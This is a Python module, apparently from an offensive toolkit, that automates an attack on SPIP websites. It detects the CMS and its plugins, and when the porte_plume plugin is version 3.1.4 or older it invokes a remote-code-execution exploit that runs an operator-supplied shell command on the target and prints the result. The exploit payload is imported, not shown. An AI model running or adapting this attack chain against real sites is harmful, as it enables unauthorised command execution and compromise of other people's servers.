import logging
from hmc.modules import Workflow, Argument
from hmc.modules.spip.detect import SPIPDetect
from hmc.modules.spip.detect_plugins import SPIPDetectPlugins
from hmc.modules.spip.plume_rce import SPIPPortePlumeRCE

log = logging.getLogger("hmc")

class SPIPAnalyzer(Workflow):
    module_name = "spip_analyzer"
    module_desc = "Auto-detect SPIP + Plugins + CVE"
    module_auth = "wayko"

    module_args = [
        Argument("domain", desc="Target domain (e.g., http://example.com)"),
        Argument("cmd", "-c", "--cmd", desc="Command to execute (RCE)", default="id"),
        Argument("proxy", "-x", "--proxy", desc="Optional HTTP proxy", default=None)
    ]
    
    def init_modules(self):

        self.rce_output = None

        self.add_module(
            SPIPDetect(),
            entries={ 'domain': 'domain' },
            outputs={
                'result': 'result'
            }
        )

        self.add_module(
            SPIPDetectPlugins(),
            entries={ 'domain': 'url' },
            outputs={ 'plugin': 'plugin' },
            condition=(['result'], lambda r: r is True)
        )

        self.add_module(
            SPIPPortePlumeRCE(),
            entries={
                'domain': 'url',
                'cmd': 'cmd',
                'proxy': 'proxy'
            },
            outputs={ 'result_rce': 'plume_rce' },
            condition=(['plugin'], lambda p: p['name'] == 'porte_plume' and p['version'] <= '3.1.4')
        )

    async def execute(self, domain, cmd, proxy):
        
        self.get_hub("cmd").write_eof(cmd)
        self.get_hub("proxy").write_eof(proxy)
        self.get_hub("domain").write_eof(domain)

        await self.wait_until_done()
        if self.rce_output is not None:
            print(self.rce_output)
        else: 
            print(f"RCE fail")

    def data_received(self, pipe, data):

        if pipe == "result_rce":
            self.rce_output = data